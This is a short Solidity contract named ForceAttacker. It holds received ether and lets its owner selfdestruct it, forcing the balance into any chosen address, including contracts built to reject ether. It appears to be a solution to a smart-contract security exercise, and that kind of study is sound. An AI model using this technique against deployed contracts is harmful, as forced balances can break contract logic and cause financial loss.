pragma solidity ^0.8.0;

contract ForceAttacker {

    address owner;

    constructor() {
        owner = msg.sender;
    }

    function selfDestruct(address transferAddress) external {
        require(msg.sender == owner);
        selfdestruct(payable(transferAddress));
    }

    receive() external payable { // take ether
    }
}